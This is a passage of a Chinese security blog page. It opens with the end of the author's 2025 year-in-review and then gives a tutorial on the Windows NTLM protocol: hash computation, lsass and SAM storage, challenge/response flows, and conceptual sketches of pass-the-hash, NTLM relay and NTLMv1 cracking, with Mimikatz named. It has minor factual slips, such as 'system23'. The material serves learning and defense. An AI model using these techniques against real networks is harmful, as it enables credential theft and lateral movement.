百度安全沙龙 攻界智慧，技破万防，这是一场围绕网络安全攻防展开的技术分享，印象最深的应该是百度蓝军的nxm师傅分享的云上攻击tricks：sts循环信任、云联网构建横向移动通道、巧用burp证书监听请求&amp;amp;hellip;&amp;amp;hellip; 在会后还被北极星师傅邀请和星盟的师傅一起吃了一顿，非常充实嘻嘻嘻
每次有离得近的安全沙龙我都会去，这是我抹平信息差的一个很好的途径，我一直觉得这样的决定很不错
实践出真知 SRC 随便挖了挖edu，由于需要学的知识还有很多，再加上工作的一部分内容和src重叠了，便没有在这上面花太多时间，不过src确实是检验自己水平的一种方式：
渗透 在打红队期间接触了很多靶标，这段时间的收获真的很大，接触了各种实战内网环境：AD域、docker、k8s&amp;amp;hellip;&amp;amp;hellip;学到了很多东西，远比自己打靶场的时候有成就感：
前端 在学了前端的基础和GSAP等前端设计后，给道格安全研究实验室写了个官网（写的一般，不会的地方求助的AI，不喜勿喷）：
http://www.d0g3.cn/
DAST 在学习企业DAST黑盒的一些知识之后，尝试写了一个DevSecOps的平台demo：https://github.com/Yuy0ung/devsecops-platform/
前端暂时只有DAST、SAST、SCA功能：
后端仅对DAST相关功能做了实现，且未做分布式，后续慢慢写吧
求职路 大二下，觉得自己小有水平，怀着忐忑的心去面了几场试，都稳稳的过了，选了一个喜欢的，开启了自己的职业生涯
安服 安全服务，我以前最嫌弃的岗位，觉得牛马，觉得都是拉去驻场的廉价劳动力，直到面试时总管担保不会安排我们去干这些杂活，并且会安排我去打打红队，我就放弃了深信服的渗透岗，来到了安恒信息，这段时间的实战水平大幅提升，连续打了3、4场红队，中途还会有很多渗透项目，除了写报告和数据安全的项目，真的能够学到很多
红队 某单位的红队研究，细节保密， 在这里只呆了短短一个多月，但学到的东西倒是很多，里面的师傅很热心有问必答，在期间拿了5个shell，打穿了3个AD域和1个K8s，成就感是无语伦比的，不过大三开学了事务繁多，于是就离职沉淀了
应用安全 大三上，耐不住性子，海投简历来到了某互联网公司干SDL，leader人很好会监督我学习、会给我指点迷津、还会给我规划学习路线，工作上也是很不错，不压榨不杂活，不过上海的房租、往返的机票、略低的薪资有点压的我喘不过气了，有没有上海富婆来救救我&amp;amp;hellip;..
思考 今年是比较失败的一年，比赛没打出什么好成绩，实习没能进入自己计划中的公司，情感经历也是失败，一直很反感别人说我成功，或许我最擅长的就是把事情搞砸
不过乐观点说，不论是工作经验、社会阅历、情感理解，都是有所进步，相信一切都在往好的方向发展，毕竟我还擅长一件事，就是坚持
写到这里，删删改改已经一个半小时了，每次写到发生的事，都会忍不住去回忆一番，像是在翻阅一本刚刚合上的旧相册，或许青春的魅力就在这里
“尚未实现的梦想，缘于年少；飘向远方的思绪，缘于岁月。”
终
">Yuy0ung的2025年度总结</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
</ul>

  
</div>
  <div class="content-center">
    <article class="markdown-body">
      <h1 class="post-title-template">Windows协议之NTLM</h1>
      <div class="post-date" style="margin-bottom: 20px; color: var(--text-color); opacity: 0.7; font-size: 0.9em;">
        
        
            2025-12-11
        
      </div>
      <h1 id="windows协议之ntlm">Windows协议之NTLM</h1>
<p>NTLM协议（New Technology LAN Manager）协议是微软用于<strong>Windows身份验证</strong>的主要协议之一</p>
<p>早期SMB协议以明文口令的形式在网络上传递，存在安全性问题，进而出现了LM（LAN manager）协议，然而该协议因为太简单，还是容易被破解，微软进而提出了NTLM协议</p>
<p>NTLM协议既可用于工作组环境中的机器身份验证，又可用于域环境身份验证，还可以为 SMB、HTTP、LDAP、SMTP 等上层微软应用提供身份验证</p>
<p>值得一提的是：NTLM是底层的认证协议，必须嵌入上层应用协议中，消息的传输依赖于使用NTLM的上层协议，比如SMB、HTTP等</p>
<h3 id="一sspi与ssp的概念">一、SSPI与SSP的概念</h3>
<h5 id="1sspi">1.SSPI</h5>
<p>SSPI（Security Service Provider Interface，安全服务提供接口）是windows定义的一套接口，该接口定义了与安全有关的功能函数，包含但不限于：</p>
<ul>
<li>身份验证机制</li>
<li>为其他协议提供的session security（会话安全）机制，会话安全可为通信提供数据的完整性校验以及数据的加密、解密功能</li>
</ul>
<p>注意：SSPI只是定义了一套接口函数，并没有实现具体内容</p>
<h5 id="2ssp">2.SSP</h5>
<p>SSP（Security Service Provider，安全服务提供者）是SSPI的实现者，微软自己实现了很多SSP，用于提供安全功能，例如：</p>
<ul>
<li>NTLM SSP：Windows NT 3.51中引入（msv1_0.dll），为Windows 2000之前的客户端-服务器域和非域身份验证（SMB/CIFS）提供 NTLM 质询/响应身份验证</li>
<li>Kerberos SSP：Windows 2000中引入，Windows vista中更新为支持AES（kerberos.dll），Windows 2000及更高版本中首选的客户端-服务器域相互身份验证</li>
<li>Digest SSP：Windows XP中引入（wdigest.dll），在 Windows 与 kerberos 不可用的非Windows系统间提供基于 HTTP 和 SASL 身份验证的质询/响应</li>
<li>Negotiate SSP:Windows 2000 中引入（secur32.dll) ，默认选择 Kerberos，如果不可用则选择 NTLM 协议。Negotiate SSP 提供单点登录能力，有时称为集成 Windows 身份验证（尤其是用于 IIS 时)。在 Windows 7 及更高版本中，NEGOExts 引入了协商使用客户端和服务器上 支持的已安装定制 SSP 进行身份验证</li>
<li>Cred SSP:Windows Vista 中引入，Windows XP SP3 上也可用 （credssp.dll)，为远程桌面连接提供单点登录（SSO)和网络级身份验证</li>
<li>Schannel SSP:Windows 2000 中引入（Schannel.dll)，Windows Vista 中 更新为支持更强的 AES 加密和 ECC[6] 该提供者使用 SSL/TLS 记录来加密数据有效载荷</li>
<li>PKU2U SSP:Windows 7 中引入（pku2u.dll) ， 在不隶属域的系统之间提供使用数字证书的对等身份验证</li>
</ul>
<p>因为SSPI中定义了与session security有关的API，所以上层应用利用任何SSP与远程的服务进行身份验证后，此SSP都会为本次连接生成一个随机key，这个key被称为session key。上层应用经过身份验证后，可以选择性的使用这个key对之后发往服务端或接收自身服务端的数据进行签名或加密</p>
<p>在系统层面，SSP就是一个dll（动态链接库），用来实现身份验证等安全功能。不同的SSP实现的身份验证机制是不一样的，比如NTLM SSP实现的是一种基于质询/响应的身份验证机制，而Kerberos SSP实现的是基于Ticket（票据）的身份验证机制，我们也可以编写自己的SSP并将其注册到操作系统中，让操作系统支持我们自定义的身份验证方法</p>
<p>可以用一张图表示SSPI、SSP和各种应用的关系：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240616204731100-347079760.png" alt="image-20240527224739470"></p>
<h3 id="二lm-hash-加密算法">二、LM Hash 加密算法</h3>
<p>LM是微软推出的一个身份认证协议，使用的加密算法是LM Hash，此加密的本质是DES加密，虽然其容易被破解，但为了保证系统兼容性，windows只是将LM Hash禁用（从windows vista和windows server 2008开始默认禁用）</p>
<p>LM Hash明文密码被限定在14位以内，也就是说，若要停止使用LM Hash，将用户的密码设置为14位以上即可，如果攻击者抓取的LM Hash为&quot;aad3b435b51404eeaad3b435b51404ee&quot;，说明LM Hash为空值或被禁用了</p>
<h3 id="三ntlm-hash加密算法">三、NTLM Hash加密算法</h3>
<p>NTLM Hash加密算法是微软为了在提高安全性的同时，保证兼容性而设计的散列加密算法，它是基于MD4加密算法进行加密的</p>
<p>为了解决LM Hash加密和身份验证方案中固有的安全弱点，微软于1993年在windows NT 3.1中首次引入了NTLM Hash，从windows vista和windows server 2008开始，默认禁用了LM Hash，只存储NTLM Hash，而LM Hash的位置则为空:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">aad3b435b51404eeaad3b435b51404ee
</span></span></code></pre></div><h5 id="1ntlm-hash加密流程">1.NTLM Hash加密流程</h5>
<p>NTLM Hash是由明文密码经过三步加密而成：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">NTLM Hash =md4(unicode(hex(password)))
</span></span></code></pre></div><p>具体如下：</p>
<ul>
<li>先将用户密码转换为16进制格式</li>
<li>再将16进制格式的字符串进行ASCII转Unicode编码</li>
<li>最后对Unicode编码的16进制字符串进行标准MD4单向哈希加密</li>
</ul>
<h5 id="2windows系统存储的ntlm-hash及ntlm本地认证">2.windows系统存储的NTLM Hash及NTLM本地认证</h5>
<p>用户的密码经过NTLM Hash加密后存储在<code>C:\Windows\system23\config\SAM</code>文件中</p>
<p>在用户输入密码进行身份验证的过程中，所有操作都是在本地进行的。系统将用户输入的密码转换为NTLM Hash，再将其与SAM中的NTLM Hash文件进行比较，若相同则说明密码正确，反之则为错误。当用户注销、重启、锁屏后，操作系统会让winlog.exe显示登陆界面，即密码输入框，在winlog.exe程序接收到输入之后，会将密码交给lsass.exe进程，lsass.exe进程中会存储一份明文密码，并将其加密成NTLM Hash，与SAM数据库进行比较和认证</p>
<p>在上述过程中，有个lsass.exe进程，我们在渗透过程中使用的Mimikatz就是从该进程中抓取的明文或Hash密码</p>
<p>使用MSF或CS通过转储Hash抓到的密码格式如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">用户名:用户SID:LM Hash:NTLM Hash:::
</span></span></code></pre></div><h3 id="四ntlm协议认证">四、NTLM协议认证</h3>
<p>NTLM协议是一种基于Challenge/Response（质询/响应）的验证机制，由三种类型消息组成：</p>
<ul>
<li>Type 1（协商，Negotiate）</li>
<li>Type 2（质询，Challenge）</li>
<li>Type 3（认证，Authentication）</li>
</ul>
<h5 id="1工作组环境下的ntlm认证">1.工作组环境下的NTLM认证</h5>
<p>工作组环境下的NTLM认证如下：</p>
<ul>
<li>
<p>当客户端需要访问服务器的某个服务时，就需要进行身份验证。在客户端输入服务器的用户名和密码进行验证后，就会缓存用户输入的服务器密码的NTLM Hash值，然后，客户端会向服务端发送一个请求，该请求利用NTLM SSP生成NTLMSSP_NEGOTIATE消息（被称为Type 1协商消息）</p>
</li>
<li>
<p>服务端接收到客户端发送过来的Type 1消息后，读取其中的内容，并从中选择自己所能接受的服务内容、加密等级、安全服务等，然后传入NTLM SSP得到NTLMSSP_CHALLENGE消息（被称为Type 2质询消息），并将此Type 2消息发回给客户端，消息中包含一个由服务器生成的16位随机值，被称为challenge值，服务端收到后会对其进行缓存</p>
</li>
<li>
<p>客户端收到服务端返回的Type 2消息后，读取服务端所支持的内容，并取出其中的challenge值，用缓存的NTLM Hash对其进行加密得到Response信息，最后将Response、用户名、challenge等信息组合得到Net-NTLM Hash，再将Net-NTLM Hash封装到NTLMSSP_AUTH消息中（被称为Type 3认证消息），发送给服务端</p>
<p>服务端收到认证消息后，从Net-NTLM Hash中取出response，然后用自己密码的HTLM Hash对challenge值进行加密，得到自己的response，将客户端发送的response和自己的作比较判断是否相等，若相等，则证明客户端输入的密码正确，认证成功，反之则认证失败</p>
</li>
</ul>
<p>可画一张图概括一下：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240616204742391-933789950.png" alt="image-20240529155528371"></p>
<h5 id="2域环境下的ntlm认证">2.域环境下的NTLM认证</h5>
<p>与工作组环境不同，在域环境中，所有域用户的Hash都存储于域控的NTDS.dit中，所以服务器本身无法计算response进行验证，所以需要与域控建立安全通道，通过域控完成最终的认证流程</p>
<p>步骤如下：</p>
<ul>
<li>Type1同工作组环境</li>
<li>Type2同工作组环境</li>
<li>Type3同工作组环境</li>
<li>服务端收到客户端发来的Type3消息后，通过Netlogon协议与域控建立一个安全通道，将验证消息转发给域控</li>
<li>域控根据Type 3消息中的用户名，在NTDS.dit中获取用户的NTLM Hash对challenge进行加密得到response，将其与Type 3消息中的response进行对比，若一致，则密码正确，认证成功，反之则失败</li>
<li>服务端根据域控返回的结果，对客户端进行相应的回复</li>
</ul>
<p>画一张图来描述：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240618181052281-566552702.png" alt="3450279-20240616204751686-1940031638"></p>
<h5 id="3ntlm-v1与ntlm-v2的区别">3.NTLM v1与NTLM v2的区别</h5>
<p>NTLM协议有NTLM v1和NTLM v2两个版本，目前使用最多的是NTLM v2，两者最显著的区别是Challenge值和加密算法不同，共同之处是都是用NTLM Hash进行加密。另外，NTLM v2存在一个扩展版本NTLM v2 Session，强化了对会话安全性的支持</p>
<ul>
<li>challenge值：
<ul>
<li>NTLM v1：8B</li>
<li>NTLM v2：16B</li>
</ul>
</li>
<li>Net-NTLM Hash使用的加密算法
<ul>
<li>NTLM v1：DES加密算法</li>
<li>NTLM v2：HMAC-MD5加密算法</li>
</ul>
</li>
</ul>
<p>Net-NTLM Hash v1和Net-NTLM Hash v2的构成格式如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Net-NTLM Hash v1
</span></span><span class="line"><span class="cl">username::hostname:LM response:NTLM response:challenge
</span></span><span class="line"><span class="cl"># Net-NTLM Hash v2
</span></span><span class="line"><span class="cl">username::domain:challenge:HMAC-MD5:blob
</span></span></code></pre></div><p>通过 Mimikatz 操作 LSASS 抓取NTLM Hash的操作受到了 Windows 10企业版和 Windows Server 2016中的凭证保护的限制，可以使用工具InternalMonologue.exe在不接触 lsass.exe进程的情况下抓取Net-NTLM Hash v1并转换为相应的NTLM Hash</p>
<h5 id="4lmcompatibilitylevel">4.LmCompatibilityLevel</h5>
<p>LmCompatibilityLevel值用来确定网络登录使用的质询/响应身份验证协议。该选项会影响客户端使用的身份验证协议的等级、协商的会话安全的等级以及服务器接受的身份验证的等级，其值对应含义如下表：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240616204758612-1185699058.png" alt="屏幕截图 2024-05-30 172409"></p>
<p>LmCompatibilityLevel值的修改通常有两种方法：</p>
<ul>
<li>手动修改本地安全策略</li>
<li>命令修改注册表lmcompatibilitylevel的值</li>
</ul>
<h3 id="五ntlm协议的安全问题">五、NTLM协议的安全问题</h3>
<p>从NTLM认证的流程中可以看到，在Type 3认证消息中是使用用户密码的HTLM Hash进行response消息的计算的，因此，在没有拿到用户密码的明文而只拿到Hash的情况下，可以进行PTH（Pass The Hash，哈希传递）攻击。同样，在Type 3消息中还存在Net-NTLM Hash，当获得了Net-NTLM Hash后，可以进行中间人攻击，重放Net-NTLM Hash，即NTLM Relay（NTLM 中继）攻击。由于NTLM v1协议加密过程存在天然缺陷，因此可以对Net-NTLM v1 Hash进行破解，得到NTLM Hash之后即可横向移动</p>
<p>（本文只对安全问题稍作介绍，后续另写文章详细研究）</p>
<h5 id="1pass-the-hash">1.pass the hash</h5>
<p>哈希传递攻击是内网横向移动的一种方式，因为NTLM认证过程中是使用用户密码的NTLM Hash来对challenge进行加密从而得到response，所以当获取到用户的HTLM Hash而未解出明文密码时，可以利用该NTLM Hash进行PTH攻击，对内网其他机器进行Hash碰撞，碰撞到使用相同密码的主机即可通过135或445端口进行横向移动</p>
<h5 id="2ntlm-relay">2.NTLM Relay</h5>
<p>严格来看，NTLM Relay的称法并不准确，而应该叫Net-NTLM Relay。作为中间人，攻击者将来自客户端的 type 1  消息转发给服务端，将来自服务端的 type 2 消息转发给客户端，而攻击发生在NTLM认证的第三步，因为 type 3 消息中存在客户端计算好的Net-NTLM Hash，所以在获取到 type 3 消息后，中间人直接将其转发给服务端，服务端验证通过后，会授予攻击者访问的权限，而不授予客户端</p>
<p>可用图片概括上述过程：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240616204807160-673217470.png" alt="image-20240530200806710"></p>
<h5 id="3net-ntlm-v1-hash破解">3.Net-NTLM v1 Hash破解</h5>
<p>由于NTLM v1身份认证协议加密过程存在天然缺陷，只要获取到Net-NTLM v1 Hash，就能破解为NTLM Hash，这与密码强度无关。在域环境中，该缺陷更为突出，因为在域中使用Hash即可远程连接目标机器。若域控允许发送NTLM v1响应，我们就可以通过与域控机器进行NTLM认证，然后抓取域控的Net-NTLM v1 Hash，破解为NTLM Hash。使用域控的机器账户和Hash即可导出域内所有用户Hash（自从Windows Vista开始，微软就默认使用NTLM v2身份认证协议，要想降级到NTLM v1的话，需要手动进行修改，并且需要目标主机的管理员权限才能进行操作）</p>

    </article>
    <p style="text-align: center; margin-top: 50px; opacity: 0.6; font-size: 0.9em;">Created by Yuy0ung. Powered by GitHub Page.</p>

  </div>
  <div class="sidebar-right">
    <h3>大纲</h3>
    <nav id="TableOfContents">
  <ul>
    <li><a href="#windows协议之ntlm">Windows协议之NTLM</a>
      <ul>
        <li>
          <ul>
            <li><a href="#一sspi与ssp的概念">一、SSPI与SSP的概念</a>
              <ul>
                <li>
                  <ul>
                    <li><a href="#1sspi">1.SSPI</a></li>
                    <li><a href="#2ssp">2.SSP</a></li>
                  </ul>
                </li>
              </ul>
            </li>
            <li><a href="#二lm-hash-加密算法">二、LM Hash 加密算法</a></li>
            <li><a href="#三ntlm-hash加密算法">三、NTLM Hash加密算法</a>
              <ul>
                <li>
                  <ul>
                    <li><a href="#1ntlm-hash加密流程">1.NTLM Hash加密流程</a></li>
                    <li><a href="#2windows系统存储的ntlm-hash及ntlm本地认证">2.windows系统存储的NTLM Hash及NTLM本地认证</a></li>
                  </ul>
                </li>
              </ul>
            </li>
            <li><a href="#四ntlm协议认证">四、NTLM协议认证</a>
              <ul>
                <li>
                  <ul>
                    <li><a href="#1工作组环境下的ntlm认证">1.工作组环境下的NTLM认证</a></li>
                    <li><a href="#2域环境下的ntlm认证">2.域环境下的NTLM认证</a></li>
                    <li><a href="#3ntlm-v1与ntlm-v2的区别">3.NTLM v1与NTLM v2的区别</a></li>
                    <li><a href="#4lmcompatibilitylevel">4.LmCompatibilityLevel</a></li>
                  </ul>
                </li>
              </ul>
            </li>
            <li><a href="#五ntlm协议的安全问题">五、NTLM协议的安全问题</a>
              <ul>
                <li>
                  <ul>
                    <li><a href="#1pass-the-hash">1.pass the hash</a></li>
                    <li><a href="#2ntlm-relay">2.NTLM Relay</a></li>
                    <li><a href="#3net-ntlm-v1-hash破解">3.Net-NTLM v1 Hash破解</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>

  </main>
  
  
  <div id="search-modal" class="search-modal">
    <div class="search-modal-content">
      
      <div class="mobile-search-header" style="display: none;">
        <button id="mobile-exit-btn" class="mobile-icon-btn">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
        </button>
      </div>

      <div class="search-input-wrapper">
        <input type="text" id="search-input" placeholder="搜索文章标题或内容...">
        <button id="mobile-search-btn" class="mobile-icon-btn mobile-search-submit" style="display: none;">
          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
        </button>
        <span class="search-loading" style="display: none;">第一次加载搜索功能可能需要一点时间...</span>
      </div>
      <div id="search-results" class="search-results"></div>
      <div class="search-footer">
        <span class="desktop-only">ESC 关闭</span>
        <span class="desktop-only">↑↓ 选择</span>
        <span class="desktop-only">Enter 跳转</span>
      </div>
    </div>
  </div>

  <script type="module">
  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.esm.min.mjs';

  mermaid.initialize({ 
    startOnLoad: false,
    theme: document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default',
    securityLevel: 'loose'
  });

  document.addEventListener('DOMContentLoaded', async () => {
    
    await mermaid.run({
      querySelector: '.mermaid'
    });
  });
</script>

</body>
</html>